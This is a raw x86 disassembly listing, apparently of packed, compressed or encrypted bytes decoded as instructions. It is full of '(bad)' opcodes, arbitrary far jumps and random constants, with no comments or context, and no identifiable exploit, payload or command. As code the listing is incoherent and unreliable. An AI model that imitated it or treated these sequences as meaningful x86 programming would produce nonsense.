  4305c4:	cmc    
  4305c5:	std    
  4305c6:	add    DWORD PTR [eax],eax
  4305c8:	cmc    
  4305c9:	add    BYTE PTR [eax],al
  4305cb:	add    dh,ah
  4305cd:	test   BYTE PTR [ebx+ecx*1-0x3d0ae42b],cl
  4305d4:	adc    bl,al
  4305d6:	jp     0x43064d
  4305d8:	loop   0x4305a7
  4305da:	neg    DWORD PTR [ecx]
  4305dc:	mov    edx,DWORD PTR [ecx+0x2bb0db3c]
  4305e2:	(bad)  [ebp+0x48]
  4305e5:	inc    eax
  4305e6:	xor    BYTE PTR [ebx+0x68],cl
  4305e9:	cmp    bh,BYTE PTR [edi+esi*2]
  4305ec:	sub    BYTE PTR [eax+0x63e3b677],ch
  4305f2:	fidivr WORD PTR [ebx+0x15]
  4305f5:	cwde   
  4305f6:	xor    dl,cl
  4305f8:	out    dx,eax
  4305f9:	and    DWORD PTR [ebx],esi
  4305fb:	jmp    0x282c:0x52f40afe
  430602:	dec    ebx
  430603:	ins    DWORD PTR es:[edi],dx
  430604:	push   esi
  430605:	adc    al,0x3e
  430607:	mov    ebx,0x138c40c2
  43060c:	in     al,0x74
  43060e:	aam    0xb
  430610:	js     0x43068e
  430612:	mov    esi,0x195b813d
  430617:	rcl    DWORD PTR [edx+0x7e],0x18
  43061b:	popa   
  43061c:	and    BYTE PTR [eax-0x1ab5e6f2],bl
  430622:	pop    ebx
  430623:	mov    ecx,0x797dd85c
  430628:	adc    DWORD PTR [ebx+0x56],ebx
  43062b:	stc    
  43062c:	enter  0x13a1,0xc2
  430630:	cmp    eax,ebx
  430632:	rcr    DWORD PTR [ebp+0x13fe9d3e],cl
  430638:	lock or eax,0x1d3b986e
  43063e:	dec    edi
  43063f:	(bad)  
  430640:	scas   al,BYTE PTR es:[edi]
  430641:	xchg   ecx,eax
  430642:	(bad)  
  430643:	std    
  430644:	or     eax,0xe7df79c1
  430649:	dec    edi
  43064a:	shl    DWORD PTR [ecx+0x6a],0xca
  43064e:	(bad)  
  43064f:	lock mov edx,0x47315f3f
  430655:	xor    al,0x11
  430657:	adc    al,0x53
  430659:	push   ebp
  43065a:	or     al,0x48
  43065c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  43065d:	int3   
  43065e:	pusha  
  43065f:	inc    esp
  430660:	xor    bl,bh
  430662:	adc    edi,DWORD PTR [ebx-0x24353a25]
  430668:	cmp    dh,cl
  43066a:	inc    esp
  43066b:	jge    0x4306cb
  43066d:	jle    0x430628
  43066f:	or     esi,DWORD PTR [ecx+ecx*2-0x2]
  430673:	push   edi
  430674:	add    al,0x47
  430676:	(bad)  
  430677:	push   0x9bafecb
  43067c:	and    DWORD PTR [edi+0x1aae640a],edi
  430682:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  430683:	loope  0x43062a
  430685:	adc    DWORD PTR gs:[ecx+esi*2-0x583e30ea],edi
  43068d:	push   0x401b1f9b
  430692:	cld    
  430693:	pop    si
  430695:	dec    esp
  430696:	xchg   ebp,eax
  430697:	iret   
  430698:	cld    
  430699:	mov    ch,0x3a
  43069b:	jg     0x43071b
  43069d:	stos   BYTE PTR es:[edi],al
  43069e:	scas   al,BYTE PTR es:[edi]
  43069f:	pushf  
  4306a0:	imul   ebx,DWORD PTR [ebx],0x4486447d
  4306a6:	or     BYTE PTR [eax-0x7189bd4c],dl
  4306ac:	push   eax
  4306ad:	adc    ch,cl
  4306af:	xor    eax,0xcdba84a
  4306b4:	fisttp QWORD PTR [eax]
  4306b6:	lods   al,BYTE PTR ds:[esi]
  4306b7:	pushf  
  4306b8:	mov    edx,0xd109262a
  4306bd:	arpl   dx,bp
  4306bf:	int3   
  4306c0:	loope  0x4306c2
	...
  430732:	add    BYTE PTR [eax],al
  430734:	jno    0x4306d7
  430736:	(bad)  
  430737:	test   al,0xd6
  430739:	(bad)  
  43073a:	jg     0x430735
  43073c:	xor    dl,ah
  43073e:	(bad)  
  43073f:	or     al,0xd3
  430741:	rcr    BYTE PTR ds:0x1feea16,0x0
  430748:	cmc    
  430749:	add    BYTE PTR [eax],al
  43074b:	add    BYTE PTR [ecx+esi*2],ah
  43074e:	add    DWORD PTR fs:[ebp-0x6],edi
  430752:	jl     0x430708
  430754:	mov    ebp,0x3e0e6226
  430759:	fs nop
  43075b:	pop    ebp
  43075c:	jne    0x43078d
  43075e:	push   ebp
  43075f:	es stos BYTE PTR es:[edi],al
  430761:	scas   al,BYTE PTR es:[edi]
  430762:	mov    al,ds:0x7f888c80
  430767:	xchg   edx,eax
  430768:	xchg   cl,al
  43076a:	sub    BYTE PTR [edx+0x49db0791],0x73
  430771:	pop    es
  430772:	dec    ebx
  430773:	mov    ebp,0xa858db55
  430778:	cld    
  430779:	cld    
  43077a:	push   esp
  43077b:	(bad)  
  43077d:	jnp    0x43075b
  43077f:	ficom  WORD PTR [esi+0x65bc12c3]
  430785:	lock dec ecx
  430787:	dec    eax
  430788:	push   0x6b
  43078a:	rcr    DWORD PTR [edx+eax*2+0x18],1
  43078e:	mov    edx,0x95035684
  430793:	push   eax
  430794:	push   eax
  430795:	cmp    bh,dh
  430797:	push   cs
  430798:	aaa    
  430799:	out    dx,al
  43079a:	out    dx,eax
  43079b:	stc    
  43079c:	cmp    al,0xaa
  43079e:	mov    al,0x1f
  4307a0:	push   ecx
  4307a1:	or     eax,0xf05d15c2
  4307a6:	fiadd  DWORD PTR [ebx]
  4307a8:	fadd   DWORD PTR [eax-0x44]
  4307ab:	ins    DWORD PTR es:[edi],dx
  4307ac:	jmp    0x4307f9
  4307ae:	jne    0x4307d6
  4307b0:	xor    DWORD PTR [ebx-0x2fbc686e],esi
  4307b6:	mov    bl,0x3d
  4307b8:	test   eax,0x65d04bd7
  4307bd:	and    dl,bl
  4307bf:	imul   esi,DWORD PTR [eax-0x8],0xc3985919
  4307c6:	cmp    al,0xe5
  4307c8:	sbb    DWORD PTR [ebp-0x3b286dda],edi
  4307ce:	lods   eax,DWORD PTR ds:[esi]
  4307cf:	pop    ss
  4307d0:	jl     0x43082d
  4307d2:	cmp    edi,edi
  4307d4:	std    
  4307d5:	add    al,0x3a
  4307d7:	add    al,0x9e
  4307d9:	push   esi
  4307da:	and    al,BYTE PTR [eax]
  4307dc:	in     al,dx
  4307dd:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4307de:	fimul  WORD PTR [ecx-0x50]
  4307e1:	dec    edx
  4307e2:	cmp    eax,0xabce33cd
  4307e7:	mov    cl,0x6d
  4307e9:	imul   edx,DWORD PTR [esi+0x0],0xf040757d
  4307f0:	pop    ecx
  4307f1:	pop    ecx
  4307f2:	ror    bl,1
  4307f4:	sub    BYTE PTR [eax+0x64],bh
  4307f7:	pusha  
  4307f8:	jecxz  0x43079c
  4307fa:	les    eax,FWORD PTR [edi+0x7a]
  4307fd:	and    DWORD PTR [edx-0x73d92baa],ebp
  430803:	pop    esi
  430804:	jmp    0x3531:0x2ba99547
  43080b:	pop    esi
  43080c:	loopne 0x4307c9
  43080e:	jl     0x4307e0
  430810:	cmp    DWORD PTR [ebx],edi
  430812:	sub    dh,BYTE PTR [edx+0x2d390c82]
  430818:	das    
  430819:	jg     0x430802
  43081b:	sahf   
  43081c:	sbb    ch,BYTE PTR [ecx+0x6deda779]
  430822:	sar    dl,cl
  430824:	(bad)  
  430825:	enter  0x42c4,0xb9
  430829:	xor    ah,0xd5
  43082c:	inc    esp
  43082d:	ret    
  43082e:	adc    al,0x7f
  430830:	rol    BYTE PTR [ebx+0x49],1
  430833:	dec    eax
  430834:	std    
  430835:	dec    esi
  430836:	sub    edi,DWORD PTR [ebx+0x6999a050]
  43083c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  43083d:	fcomp  DWORD PTR [edi]
  43083f:	pop    edx
  430840:	jl     0x430842
	...
  4308b2:	add    BYTE PTR [eax],al
  4308b4:	adc    al,0x74
  4308b6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4308b7:	push   ebp
  4308b8:	in     al,0xd5
  4308ba:	cmc    
  4308bb:	jne    0x4308f4
  4308bd:	pop    edi
  4308be:	adc    ebp,edx
  4308c0:	mov    esi,0xdf842fa5
  4308c5:	inc    DWORD PTR [ecx]
  4308c7:	add    ch,dh
  4308c9:	add    BYTE PTR [eax],al
  4308cb:	add    BYTE PTR ds:0x11712351,cl
  4308d1:	dec    ebp
  4308d2:	mov    edx,0x8c0b97c0
  4308d7:	mov    dl,0xdb
  4308d9:	push   edx
  4308da:	pushf  
  4308db:	out    dx,al
  4308dc:	retf   0x1f87
  4308df:	mov    cl,0xd3
  4308e1:	jae    0x430926
  4308e3:	cmp    al,0x8b
  4308e5:	mov    dh,0xba
  4308e7:	call   0x8ee5:0xb1fd4802
  4308ee:	shl    DWORD PTR [edx],cl
  4308f0:	sub    bl,BYTE PTR [esi-0x67]
  4308f3:	inc    ecx
  4308f4:	push   bp
  4308f6:	jp     0x43095f
  4308f8:	and    bh,BYTE PTR [ebx+0x39d3a0a7]
  4308fe:	mov    al,ds:0xbf701f51
  430903:	pop    es
  430904:	inc    edi
  430905:	xchg   ecx,eax
  430906:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  430907:	(bad)  
  430908:	repz dec edi
  43090a:	mov    dh,0x8d
  43090c:	ss test bh,al
  43090f:	mov    cl,0x86
  430911:	xor    edi,ebx
  430913:	lods   al,BYTE PTR ds:[esi]
  430914:	mov    BYTE PTR [edi-0x7c],ch
  430917:	and    BYTE PTR [ecx-0x395a7360],ah
  43091d:	mov    ch,0xf4
  43091f:	push   ecx
  430920:	push   ecx
  430921:	or     al,0x8d
  430923:	mov    ch,0x48
  430925:	in     al,dx
  430926:	(bad)  
  430927:	iret   
  430928:	xor    al,0x4e
  43092a:	and    ebp,DWORD PTR [edi]
  43092c:	dec    ebx
  43092d:	push   esi
  43092e:	sub    al,0xab
  430930:	sub    BYTE PTR [edx],0xce
  430933:	bound  esp,QWORD PTR [esi]
  430935:	xor    BYTE PTR [edi+0x3082de23],ah
  43093b:	ds clc 
  43093d:	fnstcw WORD PTR [esi-0x40]
  430940:	lock ins DWORD PTR es:[edi],dx
  430942:	add    edi,DWORD PTR [ebx+0x58]
  430945:	push   sp
  430947:	mov    dh,0x51
  430949:	xchg   ecx,eax
  43094a:	mov    al,0x8d
  43094c:	pop    ds
  43094d:	inc    edi
  43094e:	sub    eax,ebx
  430950:	inc    eax
  430951:	pop    esi
  430952:	sbb    al,0xce
  430954:	cwde   
  430955:	fmul   DWORD PTR [edx-0x63444af7]
  43095b:	inc    esp
  43095c:	mov    cs,esi
  43095e:	aaa    
  43095f:	bnd jae 0x4309dd
  430962:	ret    0x2a4
  430965:	mov    al,ds:0x35d64e86
  43096a:	cli    
  43096b:	sbb    DWORD PTR ss:[esi-0x281e436c],0xd
  430973:	enter  0x1fcc,0xc0
  430977:	das    
  430978:	mov    edx,0x7e3d18ef
  43097d:	retf   
  43097e:	xor    DWORD PTR [edi-0xd],eax
  430981:	loope  0x430970
  430983:	popa   
  430984:	(bad)
  430987:	sub    ebx,esi
  430989:	repz cmp al,0x74
  43098c:	xor    DWORD PTR [ebx+0x6fbff7f3],0x6c79d3cb
  430996:	aas    
  430997:	iret   
  430998:	in     al,0xe9
  43099a:	mov    ah,0x1d
  43099c:	mov    edx,0x6f1ac232
  4309a1:	in     eax,0x3c
  4309a3:	aas    
  4309a4:	rcl    ch,1
  4309a6:	mov    al,ds:0x8db4a909
  4309ab:	rol    dl,1
  4309ad:	add    al,0x56
  4309af:	sbb    dh,BYTE PTR [ebp-0x33]
  4309b2:	into   
  4309b3:	cmp    bh,BYTE PTR [ebx]
  4309b5:	les    edx,FWORD PTR [ebp-0x43391d46]
  4309bb:	jecxz  0x430958
  4309bd:	adc    DWORD PTR [edx+esi*2-0xb],esi
	...
  430a31:	add    BYTE PTR [eax],al
  430a33:	add    BYTE PTR [ebx],bl
  430a35:	out    dx,eax
  430a36:	shl    BYTE PTR [esi],0xf4
  430a39:	aas    
  430a3a:	(bad)  
  430a3b:	out    dx,eax
  430a3c:	fwait
  430a3d:	aaa    
  430a3e:	call   0x8afc737
  430a43:	pop    edi
  430a44:	aam    0x0
  430a46:	add    al,BYTE PTR [eax]
  430a48:	cmc    
  430a49:	add    BYTE PTR [eax],al
  430a4b:	add    BYTE PTR [esi+0x116101fa],ah
  430a51:	clc    
  430a52:	fs push cs
  430a54:	and    dl,BYTE PTR [esi+0x58cf767c]
  430a5a:	dec    ebx
  430a5b:	mov    al,0xfe
  430a5d:	mov    dl,0x5f
  430a5f:	data16 aam 0x19
  430a62:	jmp    FWORD PTR [esi+0x132c6ac8]
  430a68:	cmp    BYTE PTR [edx],0x21
  430a6b:	sbb    DWORD PTR [ebx+edx*1+0x7abf6ead],0xffffffea
  430a73:	(bad)  
  430a74:	add    al,0x31
  430a76:	jecxz  0x430a58
  430a78:	aas    
  430a79:	add    eax,0xa176e715
  430a7e:	jmp    0x7bec:0x8814e32a
  430a85:	fyl2x  
  430a87:	xor    DWORD PTR [ecx+0x2a],ecx
  430a8a:	in     eax,dx
  430a8b:	sub    DWORD PTR [ebp+0x202ce313],eax
  430a91:	out    dx,eax
  430a92:	popa   
  430a93:	sbb    al,0xf7
  430a95:	out    0x85,eax
  430a97:	loop   0x430a46
  430a99:	out    0xbe,eax
  430a9b:	inc    edi
  430a9c:	in     eax,0xd5
  430a9e:	popf   
  430a9f:	out    dx,al
  430aa0:	mov    dh,0x2e
  430aa2:	adc    BYTE PTR [ebx-0x6d],cl
  430aa5:	add    al,0xa8
  430aa7:	and    al,0xac
  430aa9:	adc    eax,0x4869a77c
  430aae:	dec    esp
  430aaf:	jp     0x430b01
  430ab1:	lahf   
  430ab2:	call   0x8806912b
  430ab7:	dec    ebx
  430ab8:	retf   0xd33d
  430abb:	mov    bh,0x5e
  430abd:	sbb    eax,0x5c10609d
  430ac2:	dec    eax
  430ac3:	adc    al,0xb9
  430ac5:	jecxz  0x430a93
  430ac7:	shr    BYTE PTR [eax-0x1690c29a],cl
  430acd:	mov    dl,0xe3
  430acf:	inc    DWORD PTR [esi]
  430ad1:	pop    ebx
  430ad2:	jb     0x430b05
  430ad4:	fwait
  430ad5:	mov    ecx,DWORD PTR [esi]
  430ad7:	lahf   
  430ad8:	pop    edx
  430ad9:	inc    esi
  430ada:	cmp    ecx,DWORD PTR [ebx-0x7b]
  430add:	imul   eax,DWORD PTR ss:[edi+edx*4-0x61],0x3be77737
  430ae6:	js     0x430aea
  430ae8:	lea    eax,[esi-0x703f3d1a]
  430aee:	push   ebp
  430aef:	aas    
  430af0:	fsub   DWORD PTR [esi]
  430af2:	adc    ebp,esi
  430af4:	loopne 0x430b0e
  430af6:	test   DWORD PTR [esi-0x28143c34],eax
  430afc:	popf   
  430afd:	js     0x430aa8
  430aff:	cmp    DWORD PTR [eax-0x16bece6d],ebx
  430b05:	xor    BYTE PTR [eax-0xc],0x11
  430b09:	sbb    eax,0xc0ac1734
  430b0e:	shl    BYTE PTR [eax+0x6c],cl
  430b11:	jo     0x430abc
  430b13:	mov    esp,0xd16091f0
  430b18:	xlat   BYTE PTR ds:[ebx]
  430b19:	cmp    DWORD PTR [esi-0x443f7885],esi
  430b1f:	inc    edx
  430b20:	out    dx,al
  430b21:	inc    ebx
  430b22:	call   0x346017dc
  430b27:	icebp  
  430b28:	call   0xc43d:0x28f256e
  430b2f:	dec    ebp
  430b30:	retf   0xb220
  430b33:	mov    ecx,0xd79dd801
  430b38:	lods   al,BYTE PTR ds:[esi]
  430b39:	lods   eax,DWORD PTR ds:[esi]
  430b3a:	push   edx
  430b3b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  430b3c:	or     eax,0x8e76db9f
	...
  430bb1:	add    BYTE PTR [eax],al
  430bb3:	add    BYTE PTR [ebx],cl
  430bb5:	mov    BYTE PTR [ebx-0x44c45ce7],ah
  430bbb:	call   0x9655:0x3f4217e6
  430bc2:	ins    DWORD PTR es:[edi],dx
  430bc3:	add    ecx,ecx
  430bc5:	add    DWORD PTR [edx],eax
  430bc7:	add    ch,dh
  430bc9:	add    BYTE PTR [eax],al
  430bcb:	add    BYTE PTR [eax],dl
  430bcd:	cwde   
  430bce:	imul   edx,DWORD PTR [ebp+0x6e09bdf1],0x7c
  430bd5:	ds inc esi
  430bd7:	int    0x82
  430bd9:	mov    esi,0x5175088e
  430bde:	scas   eax,DWORD PTR es:[edi]
  430bdf:	in     eax,dx
  430be0:	mov    ebx,0xc05c9489
  430be5:	push   esp
  430be6:	adc    DWORD PTR [edi+0x3ad0b55b],edi
  430bec:	rol    DWORD PTR [ebx+0x6],cl
  430bef:	xor    BYTE PTR [esi+0x43028ee0],cl
  430bf5:	jp     0x430b91
  430bf7:	sbb    eax,esp
  430bf9:	pop    ds
  430bfa:	(bad)  
  430bfc:	cmp    edx,ebx
  430bfe:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  430bff:	push   esp
  430c00:	outs   dx,BYTE PTR ds:[esi]
  430c01:	scas   al,BYTE PTR es:[edi]
  430c02:	xchg   esp,eax
  430c03:	push   esi
  430c04:	(bad)  
  430c06:	mov    DWORD PTR [esi-0x74c0eb9e],ecx
  430c0c:	call   0x1d88a139
  430c11:	loope  0x430c2e
  430c13:	loopne 0x430c76
  430c15:	clc    
  430c16:	xor    al,0xea
  430c18:	cmp    cl,BYTE PTR [ebx]
  430c1a:	repnz rep outs dx,BYTE PTR ds:[esi]
  430c1d:	jmp    0x8c3d1b3a
  430c22:	sbb    ah,BYTE PTR [edx-0x69cc6232]
  430c28:	inc    ebp
  430c29:	sbb    BYTE PTR [ebx],ch
  430c2b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  430c2c:	and    al,0xff
  430c2e:	push   ds
  430c2f:	stos   BYTE PTR es:[edi],al
  430c30:	ret    
  430c31:	adc    dh,BYTE PTR [ecx-0x19]
  430c34:	int3   
  430c35:	loop   0x430c49
  430c37:	inc    eax
  430c38:	bound  esi,QWORD PTR [esi]
  430c3a:	and    al,0x78
  430c3c:	mov    ch,BYTE PTR [ebx+0x53c5060f]
  430c42:	bound  edx,QWORD PTR [edi-0x57a6ea29]
  430c48:	retf   0x6767
  430c4b:	out    dx,al
  430c4c:	in     eax,0xd4
  430c4e:	jne    0x430c16
  430c50:	jne    0x430bd6
  430c52:	jae    0x430be8
  430c54:	mov    ah,BYTE PTR [edx]
  430c56:	jne    0x430c73
  430c58:	js     0x430c9e
  430c5a:	adc    al,0xff
  430c5c:	xchg   ecx,eax
  430c5d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  430c5e:	std    
  430c5f:	sbb    eax,0x7517f177
  430c64:	inc    ebx
  430c65:	loop   0x430ccc
  430c67:	mov    bh,0x9d
  430c69:	or     edi,edx
  430c6b:	cmp    al,0xda
  430c6d:	not    BYTE PTR [edx-0x211a7fae]
  430c73:	add    eax,0xf832b394
  430c78:	jl     0x430c25
  430c7a:	test   BYTE PTR [ebx-0x79],ch
  430c7d:	(bad)  
  430c7e:	lea    edi,[edx]
  430c80:	mov    cl,0x3e
  430c82:	lock int 0xd5
  430c85:	mov    dl,0x5f
  430c87:	dec    edx
  430c88:	out    0xc5,al
  430c8a:	loopne 0x430c59
  430c8c:	mov    eax,0x1cb35e5a
  430c91:	or     ebx,0x13
  430c94:	xlat   BYTE PTR ds:[ebx]
  430c95:	retf   0xe64
  430c98:	dec    cl
  430c9a:	mov    ah,0xc9
  430c9c:	xchg   edi,eax
  430c9d:	repz in al,0x5d
  430ca0:	cli    
  430ca1:	cmp    ebp,edi
  430ca3:	jl     0x430cc6
  430ca5:	popa   
  430ca6:	cwde   
  430ca7:	ss push esi
  430caa:	icebp  
  430cab:	cmp    eax,0xf370e9b5
  430cb0:	popf   
  430cb1:	pop    ds
  430cb2:	int    0x68
  430cb4:	dec    esi
  430cb5:	add    al,0xae
  430cb7:	and    DWORD PTR [ebx+0x5c],edx
  430cba:	nop
  430cbb:	mov    ebx,0x728e5bbd
	...
  430d34:	dec    eax
  430d35:	rol    dl,0xf0
  430d38:	retf   0x7af2
  430d3b:	clc    
  430d3c:	ror    BYTE PTR [ecx],1
  430d3e:	cdq    
  430d3f:	jl     0x430d98
  430d41:	mov    al,ds:0x2be5017
  430d46:	add    al,BYTE PTR [eax]
  430d48:	cmc    
  430d49:	add    BYTE PTR [eax],al
  430d4b:	add    BYTE PTR [eax],bh
  430d4d:	pop    esp
  430d4e:	mov    dl,0xe6
  430d50:	jae    0x430d7d
  430d52:	call   0x4ac61bc5
  430d57:	nop
  430d58:	inc    edx
  430d59:	repnz sahf 
  430d5b:	jne    0x430d41
  430d5d:	test   ecx,eax
  430d5f:	jp     0x430ce2
  430d61:	mov    BYTE PTR [ecx+0x4877bb08],dl
  430d67:	inc    ecx
  430d68:	mov    ds:0x95948a1d,al
  430d6d:	bound  esp,QWORD PTR [esi-0x7de4e788]
  430d73:	out    0x16,eax
  430d75:	icebp  
  430d76:	das    
  430d77:	xor    BYTE PTR [edx-0x44629c46],dl
  430d7d:	ret    
  430d7e:	lds    edx,FWORD PTR [ecx+0x4a]
  430d81:	push   edx
  430d82:	pushw  0xffae
  430d85:	mov    al,0x5
  430d87:	dec    ecx
  430d88:	add    al,BYTE PTR [edx-0x5d]
  430d8b:	or     al,0x40
  430d8d:	call   0xc3871400
  430d92:	inc    ebp
  430d93:	jnp    0x430dbc
  430d95:	hlt    
  430d96:	adc    al,0xef
  430d98:	pusha  
  430d99:	and    eax,0x5833dfa
  430d9e:	pop    ebp
  430d9f:	fs cmp eax,0xcf8b686d
  430da5:	sub    BYTE PTR [ecx],cl
  430da7:	push   ebx
  430da8:	adc    eax,0xd848bfa6
  430dad:	ins    BYTE PTR es:[edi],dx
  430dae:	ficomp DWORD PTR [edx-0x6d8901ba]
  430db4:	pop    ss
  430db5:	neg    DWORD PTR [edx+0x26]
  430db8:	push   ds
  430db9:	popf   
  430dba:	or     DWORD PTR [esi-0x47],esi
  430dbd:	sbb    bl,BYTE PTR [ebp-0x3477f963]
  430dc3:	add    DWORD PTR [edi+0x2c1e514b],0x5367c30
  430dcd:	ja     0x430e14
  430dcf:	jne    0x430e06
  430dd1:	mov    dl,0x1e
  430dd3:	imul   ebx,ecx,0xfffffffe
  430dd6:	rcr    DWORD PTR [ebx+0x51246a36],0x10
  430ddd:	fsub   DWORD PTR [eax-0x39]
  430de0:	xor    al,0xe
  430de2:	dec    esi
  430de3:	jo     0x430dfb
  430de5:	cs jno 0x430e18
  430de8:	leave  
  430de9:	inc    eax
  430dea:	jne    0x430e64
  430dec:	in     eax,0x53
  430dee:	fild   DWORD PTR [edx+0x20683275]
  430df4:	pop    eax
  430df5:	pop    eax
  430df6:	stos   DWORD PTR es:[edi],eax
  430df7:	aaa    
  430df8:	push   esi
  430df9:	mov    ds:0x2acbeffe,eax
  430dfe:	jno    0x430e1a
  430e00:	xchg   edx,eax
  430e01:	pop    edx
  430e02:	jecxz  0x430e37
  430e04:	jo     0x430e5b
  430e06:	(bad)  
  430e07:	sti    
  430e08:	push   edi
  430e09:	cmp    al,0x19
  430e0b:	pop    edi
  430e0c:	jae    0x430db6
  430e0e:	pop    es
  430e0f:	sub    DWORD PTR [esi-0x64c7d769],esi
  430e15:	stos   DWORD PTR es:[edi],eax
  430e16:	dec    BYTE PTR [ebx-0x64]
  430e19:	inc    eax
  430e1a:	out    dx,eax
  430e1b:	dec    esp
  430e1c:	xchg   ebp,eax
  430e1d:	sahf   
  430e1e:	mov    esi,0xdbd05b21
  430e23:	add    DWORD PTR [ebp-0x3f250ba7],edi
  430e29:	push   0x97e5bbaa
  430e2e:	sbb    bh,cl
  430e30:	pop    ss
  430e31:	cwde   
  430e32:	sub    DWORD PTR [edi-0x674b099c],ecx
  430e38:	mov    cl,0x2a
  430e3a:	movs   DWORD PTR es:[di],DWORD PTR ds:[si]
  430e3c:	cdq    
  430e3d:	jae    0x430e4e
  430e3f:	mov    es,WORD PTR ds:0x0
	...
  430eb1:	add    BYTE PTR [eax],al
  430eb3:	add    BYTE PTR [edi+eiz*2],al
  430eb6:	std    
  430eb7:	aaa    
  430eb8:	(bad)  
  430eb9:	mov    edi,0x8a6677ce
  430ebe:	retf   
  430ebf:	jne    0x430e60
  430ec1:	or     al,0x10
  430ec3:	div    BYTE PTR [ebx-0xafffdfd]
  430ec9:	add    BYTE PTR [eax],al
  430ecb:	add    BYTE PTR [esi-0x27],bh
  430ece:	adc    DWORD PTR [ecx+0x4852cf88],0xd9746ed5
  430ed8:	sbb    BYTE PTR [ecx-0x58],bl
  430edb:	pop    ebp
  430edc:	xchg   ebp,eax
  430edd:	fldcw  WORD PTR [edi]
  430edf:	gs or  eax,0x91f78c5a
  430ee5:	xchg   edi,eax
  430ee6:	xchg   edx,eax
  430ee7:	jnp    0x430ebb
  430ee9:	xor    BYTE PTR [esi],bl
  430eeb:	xchg   esp,eax
  430eec:	push   esp
  430eed:	xchg   BYTE PTR [edi],dh
  430eef:	test   al,0x94
  430ef1:	std    
  430ef2:	rcr    BYTE PTR [eax+0x759683f1],0xfa
  430ef9:	imul   DWORD PTR [ecx]
  430efb:	ja     0x430e9e
  430efd:	scas   al,BYTE PTR es:[edi]
  430efe:	mov    edx,DWORD PTR [ebx]
  430f00:	mov    cl,0xfd
  430f02:	leave  
  430f03:	mov    ds:0xa360a609,eax
  430f08:	sbb    cl,BYTE PTR [edx]
  430f0a:	adc    BYTE PTR [ecx],dl
  430f0c:	mov    esi,0xdefa1728
  430f11:	add    al,0x3f
  430f13:	jno    0x430f5d
  430f15:	adc    ebx,esp
  430f17:	push   eax
  430f18:	inc    ebp
  430f19:	push   eax
  430f1a:	mov    ds:0xc7fb9b4b,eax
  430f1f:	iret   
  430f20:	popf   
  430f21:	dec    edi
  430f22:	adc    eax,DWORD PTR [ebx-0x3f194531]
  430f28:	jnp    0x430f74
  430f2a:	shl    DWORD PTR [esi],1
  430f2c:	jle    0x430f9d
  430f2e:	cmp    DWORD PTR [eax-0x5d98a191],ebp
  430f34:	lds    ebp,FWORD PTR [esi]
  430f36:	xchg   ebx,eax
  430f37:	retf   0x76fc
  430f3a:	inc    ebx
  430f3b:	(bad)  [edx-0x5b]
  430f3e:	sub    al,0x88
  430f40:	mov    al,0x16
  430f42:	cmp    eax,DWORD PTR [ebx+eax*4]
  430f45:	loope  0x430f7a
  430f47:	cmp    bl,bl
  430f49:	mov    eax,0x144c4578
  430f4e:	inc    esp
  430f4f:	inc    edi
  430f50:	mov    edi,0x7dca87e5
  430f55:	pop    ecx
  430f56:	inc    ebx
  430f57:	fmul   DWORD PTR [eax+0x2eb1219f]
  430f5d:	push   cs
  430f5e:	mov    esp,0xea87c86f
  430f63:	dec    edi
  430f64:	xor    esi,ecx
  430f66:	mov    cl,bh
  430f68:	mov    dh,0x98
  430f6a:	inc    esi
  430f6b:	sub    DWORD PTR [edx+0x282db6c5],ebp
  430f71:	dec    edx
  430f72:	and    BYTE PTR [ebx-0x5e3edf41],ah
  430f78:	inc    edi
  430f79:	jne    0x430ff9
  430f7b:	pop    ss
  430f7c:	adc    edx,DWORD PTR [ecx-0x7b]
  430f7f:	or     BYTE PTR ds:0x3140a1fa,dl
  430f85:	dec    edi
  430f86:	jecxz  0x430fb7
  430f88:	and    dl,0x6b
  430f8b:	in     al,dx
  430f8c:	js     0x430fb8
  430f8e:	loop   0x430fde
  430f90:	hlt    
  430f91:	inc    edi
  430f92:	inc    edi
  430f93:	pop    esp
  430f94:	jns    0x430f4d
  430f96:	mov    ebx,0x84afaf83
  430f9b:	fwait
  430f9c:	jmp    0x3565:0xca34e6a8
  430fa3:	jle    0x430f73
  430fa5:	add    DWORD PTR [ebx-0x6],edi
  430fa8:	nop
  430fa9:	dec    ebx
  430faa:	icebp  
  430fab:	ss retf 
  430fad:	outs   dx,BYTE PTR ds:[esi]
  430fae:	sub    DWORD PTR [esi+0xe],0xffffffce
  430fb2:	daa    
  430fb3:	(bad)  
  430fb4:	mov    DWORD PTR [ebx],0x4e3a6f70
  430fba:	xchg   DWORD PTR [ebx],esp
  430fbc:	loop   0x430fd5
  430fbe:	dec    ebp
  430fbf:	pop    ebx
  430fc0:	add    DWORD PTR [eax],eax
	...
  431032:	add    BYTE PTR [eax],al
  431034:	(bad)  
  431035:	ins    DWORD PTR es:[edi],dx
  431036:	aam    0xb5
  431038:	(bad)  
  431039:	mov    ebp,0xead87fe7
  43103e:	fs dec esp
  431040:	xor    eax,0xa8dce2d5
  431045:	add    al,0x2
  431047:	add    BYTE PTR [eax+eax*1],ch
  43104a:	add    BYTE PTR [eax],al
  43104c:	adc    ebx,DWORD PTR [edi-0x6755c58b]
  431052:	jo     0x4310ac
  431054:	pop    eax
  431055:	loopne 0x43108d
  431057:	idiv   BYTE PTR [ebp-0x7d73c812]
  43105d:	add    ebx,DWORD PTR [ecx-0x67a92fd9]
  431063:	xor    DWORD PTR [eax+0x58b0cdc9],eax
  431069:	inc    edi
  43106a:	sbb    al,0x6e
  43106c:	xchg   ecx,eax
  43106d:	unpckhps xmm5,xmm5
  431070:	xor    dl,ch
  431072:	push   DWORD PTR [ebp+0xa]
  431075:	pop    esp
  431076:	test   eax,0xc9
	...
  4310b3:	add    BYTE PTR [ebp+0x55],cl
  4310b6:	mov    DWORD PTR [ebx-0x7e9f13f8],ecx
  4310bc:	mov    esp,ebp
  4310be:	or     al,ah
  4310c0:	dec    ebp
  4310c1:	add    bh,al
  4310c3:	add    BYTE PTR [eax],cl
  4310c5:	add    BYTE PTR [eax],al
  4310c7:	mov    DWORD PTR [eax],0x3ef44545
  4310cd:	add    BYTE PTR ss:[ebp-0x70b6375],al
  4310d4:	retf   
